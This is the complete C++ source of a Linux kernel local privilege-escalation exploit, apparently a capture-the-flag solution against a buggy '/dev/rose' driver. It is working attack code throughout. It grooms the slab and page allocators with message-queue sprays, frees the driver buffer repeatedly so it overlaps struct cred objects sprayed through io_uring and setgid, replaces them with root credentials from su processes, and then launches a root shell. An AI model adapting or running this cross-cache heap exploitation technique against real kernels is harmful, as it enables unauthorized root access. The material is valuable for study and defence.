// clang++ -std=c++2a -o kernel_exploit -static -Os kernel_exploit.cc -luring
#include <fcntl.h>
#include <liburing.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/fsuid.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <latch>
#include <thread>
#include <vector>

#define CHECK(condition)                                              \
  do {                                                                \
    if (!(condition)) {                                               \
      CheckFailure("Check failed at %s:%d: %s\n", __FILE__, __LINE__, \
                   #condition);                                       \
    }                                                                 \
  } while (0);

#define PCHECK(condition)                                                  \
  do {                                                                     \
    if (!(condition)) {                                                    \
      CheckFailure("Check failed at %s:%d (%m): %s\n", __FILE__, __LINE__, \
                   #condition);                                            \
    }                                                                      \
  } while (0);

void CheckFailure(const char* format, ...) {
  //asm("int3");
  va_list ap;
  va_start(ap, format);
  vfprintf(stderr, format, ap);
  va_end(ap);
  abort();
}

std::vector<int> rose_fds;

void OpenRose() {
  int fd = open("/dev/rose", O_RDONLY);
  PCHECK(fd != -1);
  rose_fds.push_back(fd);
}

void CloseRose() {
  CHECK(!rose_fds.empty());
  int fd = rose_fds.back();
  rose_fds.pop_back();
  PCHECK(close(fd) == 0);
}

template <size_t Size>
int SprayMsg() {
  struct msg {
    long mtype;
    char mtext[Size - 48];
  } msg = {};
  msg.mtype = 1;

  // Note: msg_msg is allocated with GFP_KERNEL_ACCOUNT, while the buggy
  // buffer in the challenge uses GFP_KERNEL. In the challenge
  // environment, both of these are backed by the same cache because
  // CONFIG_MEMCG_KMEM is disabled. A more precise exploit might spray a
  // GFP_KERNEL allocation in the 1024 bucket.
  int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
  PCHECK(msqid != -1);
  PCHECK(msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == 0);
  return msqid;
}

void FreeMsg(int msqid) { PCHECK(msgctl(msqid, IPC_RMID, nullptr) == 0); }

void DumpFile(const char* filename) {
  char buf[1024];
  int fd = open(filename, O_RDONLY);
  PCHECK(fd != -1);
  while (true) {
    int nread = read(fd, buf, sizeof(buf));
    PCHECK(nread >= 0);
    if (nread == 0) {
      break;
    }
    write(1, buf, nread);
  }
  PCHECK(close(fd) == 0);
}

void SetGidCurrentThread(gid_t gid) {
  // `setgid()` propagates to all threads, which can be much slower.
  PCHECK(syscall(__NR_setgid, gid) == 0);
}

void Pause() {
  printf("Pause...");
  fflush(stdout);
  getchar();
}

void PinToCpu(int cpu) {
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(0, &cpuset);
  PCHECK(sched_setaffinity(0, sizeof(cpuset), &cpuset) == 0);
}

int main(int argc, char** argv) {
  // When debugging, run the exploit as root and drop privileges to
  // enable dumping /sys and /proc files.
  //seteuid(1000);
  //setfsuid(0);

  // Not really needed, since the challenge isn't SMP, but why not?
  PinToCpu(0);

  //DumpFile("/sys/kernel/slab/kmalloc-1k/objs_per_slab");
  constexpr int kMalloc1kObjsPerSlab = 8;

  //DumpFile("/sys/kernel/slab/kmalloc-1k/cpu_partial");
  constexpr int kMalloc1kCpuPartialObjs = 24;
  constexpr int kMalloc1kCpuPartialSlabs = kMalloc1kCpuPartialObjs * 2 / kMalloc1kObjsPerSlab;

  // Minimum number of partial slabs on the kmem_cache_node freelist.
  //DumpFile("/sys/kernel/slab/kmalloc-1k/min_partial");
  constexpr int kMalloc1kMinPartial = 5;

  //DumpFile("/sys/kernel/slab/kmalloc-512/objs_per_slab");
  constexpr int kMalloc512ObjsPerSlab = 8;

  //DumpFile("/sys/kernel/slab/cred_jar/objs_per_slab");
  constexpr int kCredJarObjsPerSlab = 21;

  int pipe_fds[2];
  PCHECK(pipe(pipe_fds) == 0);

  printf("Starting processes\n");
  std::vector<pid_t> pids;
  for (int i = 0; i < kCredJarObjsPerSlab; ++i) {
    const pid_t pid = fork();
    if (pid == 0) {
      PCHECK(close(pipe_fds[1]) == 0);
      PCHECK(close(1) == 0);
      PCHECK(close(2) == 0);
      char c;
      PCHECK(read(pipe_fds[0], &c, 1) == 0);
      execl("/bin/su", "su", nullptr);
      PCHECK(false);
    }
    pids.push_back(pid);
  }

  PCHECK(close(pipe_fds[0]) == 0);
  const auto start_exec_su = [&] {
    PCHECK(close(pipe_fds[1]) == 0);
  };

  struct io_uring ring;
  PCHECK(io_uring_queue_init(64, &ring, 0) == 0);

  printf("Starting threads\n");
  std::vector<std::thread> threads;
  std::latch unblock_threads(1);
  std::latch setgids_done(kCredJarObjsPerSlab);
  std::latch replacement_done(1);
  for (int i = 0; i < kCredJarObjsPerSlab; ++i) {
    threads.emplace_back([&, i] {
      PinToCpu(0);
      unblock_threads.wait();

      // Allocate struct cred (previously, we were sharing the
      // one from the main thread).
      SetGidCurrentThread(getgid());
      setgids_done.count_down();

      replacement_done.wait();
      if (geteuid() == 0) {
        printf("*** [%d] Got root! ***\n", i);
        PCHECK(io_uring_register_personality(&ring) >= 0);
        PCHECK(syscall(__NR_setresuid, 0, 0, 0) == 0);
        PCHECK(syscall(__NR_setresgid, 0, 0, 0) == 0);
        
        execl("/bin/sh", "sh", "-i", nullptr);
        PCHECK(false);
      }
    });
  }

  for (int i = 0; i < 2; ++i) {
    OpenRose();
  }

  printf("Allocating page allocator CPU free list fillers\n");
  std::vector<int> page_allocator_cpu_free_list_fillers;
  for (int i = 0; i < kMalloc512ObjsPerSlab * 1000; ++i) {
    page_allocator_cpu_free_list_fillers.push_back(SprayMsg<512>());
  }

  printf("Allocating partial list fillers\n");
  std::vector<int> node_partial_fillers;

  constexpr int kNumIters = (kMalloc1kMinPartial + kMalloc1kCpuPartialSlabs - 1) / kMalloc1kCpuPartialSlabs;
  for (int i = 0; i < (kMalloc1kCpuPartialSlabs * kNumIters+ 1) * kMalloc1kObjsPerSlab; ++i) {
    node_partial_fillers.push_back(SprayMsg<1024>());
  }

  std::vector<int> cpu_partial_fillers;
  for (int i = 0; i < (kMalloc1kCpuPartialSlabs - 2) * kMalloc1kObjsPerSlab; ++i) {
    cpu_partial_fillers.push_back(SprayMsg<1024>());
  }

  // The above should also exhaust all partial lists.
  //DumpFile("/sys/kernel/slab/kmalloc-1k/slabs_cpu_partial");

  //Pause();

  printf("Allocating target slab\n");
  std::vector<int> target_slab;
  for (int i = 0; i < kMalloc1kObjsPerSlab; ++i) {
    target_slab.push_back(SprayMsg<1024>());
  }
  printf("Allocating target buffer\n");
  OpenRose();
  for (int i = 0; i < kMalloc1kObjsPerSlab - 1; ++i) {
    target_slab.push_back(SprayMsg<1024>());
  }

  // Ensure that the target slab is not the active slab.
  printf("Ensuring new active slab\n");
  SprayMsg<1024>();

  printf("Filling node partial free list\n");
  for (int i = 0; i < node_partial_fillers.size(); i += kMalloc1kObjsPerSlab) {
    FreeMsg(node_partial_fillers[i]);
    //DumpFile("/sys/kernel/slab/kmalloc-1k/slabs_cpu_partial");
  }

  // The node partial free list should now be full. The CPU partial free
  // list should contain one slab.
  printf("Freeing target slab\n");
  //DumpFile("/sys/kernel/slab/kmalloc-1k/slabs_cpu_partial");
  CloseRose();
  //DumpFile("/sys/kernel/slab/kmalloc-1k/slabs_cpu_partial");
  for (int i = 0; i < target_slab.size(); ++i) {
    FreeMsg(target_slab[i]);
    //DumpFile("/sys/kernel/slab/kmalloc-1k/slabs_cpu_partial");
  }

  // The CPU partial list should now contain 3 or 4 slabs, since the
  // target frees should have spanned 2 or 3 slabs.
  printf("Filling CPU partial list\n");
  //DumpFile("/sys/kernel/slab/kmalloc-1k/slabs_cpu_partial");
  for (int i = 0; i < kMalloc1kCpuPartialSlabs - 2; ++i) {
    FreeMsg(cpu_partial_fillers[i * kMalloc1kObjsPerSlab]);
    //DumpFile("/sys/kernel/slab/kmalloc-1k/slabs_cpu_partial");
  }

  //Pause();

  // At this point, the page allocator's per-cpu list should contain an
  // order-2 page containing the rose buffer we can free. Our goal now
  // is to flush the per-cpu list back into the page allocator free
  // lists. We do this by freeing a bunch of allocations.
  printf("Flushing page allocator per-CPU list\n");
  //DumpFile("/proc/zoneinfo");
  for (int msg : page_allocator_cpu_free_list_fillers) {
    FreeMsg(msg);
  }
  //DumpFile("/proc/zoneinfo");

  // Spray `struct cred` to reallocate the page containing our buffer as
  // a cred jar cache slab.
  //
  // Reliability note: `io_uring_register_personality()` also appears to
  // allocate slabs for the kmalloc-32 and radix_tree_node caches, which
  // could theoretically steal our page. A more reliable exploit would
  // keep those free lists populated during the spray to prevent that
  // from happening.
  printf("Spraying struct cred\n");
  for (int i = 0; i < 50000; ++i) {
    PCHECK(io_uring_register_personality(&ring) >= 0);
    SetGidCurrentThread(getgid());
  }

  //Pause();

  //DumpFile("/proc/slabinfo");
  // This should free an address owned by the cred jar cache.
  printf("Double freeing buffer\n");
  CloseRose();
  //DumpFile("/proc/slabinfo");

  // Unblock our threads, which will allocate `kCredJarObjsPerSlab`
  // `struct cred`s. One of them should be the address we just freed
  // above.
  unblock_threads.count_down();
  printf("Waiting for threads to allocate creds\n");
  setgids_done.wait();

  // Free the buffer address again. If everything went well, then this
  // will free one of the thread's `struct cred`s.
  printf("Triple freeing buffer (now creds)\n");
  CloseRose();

  // Trigger `kCredJarObjsPerSlab` allocations of root `struct creds`.
  // One of them should be allocated at the address we just freed.
  printf("Replacing with privileged creds\n");
  start_exec_su();

  printf("Waiting for su processes\n");
  std::vector<pid_t> remaining = pids;
  while (!remaining.empty()) {
    pid_t pid = remaining.back();
    const std::string path = "/proc/" + std::to_string(pid);
    struct stat st;
    PCHECK(stat(path.c_str(), &st) == 0);
    if (st.st_uid != 0) {
      sleep(1);
      continue;
    }
    kill(pid, SIGSTOP);
    remaining.pop_back();
  }
  system("stty echo");

  printf("Waking threads\n");
  replacement_done.count_down();

  for (auto& thread : threads) {
    thread.join();
  }

  printf("Exploit failed :-(\n");
  raise(SIGSTOP);
  return 0;
}
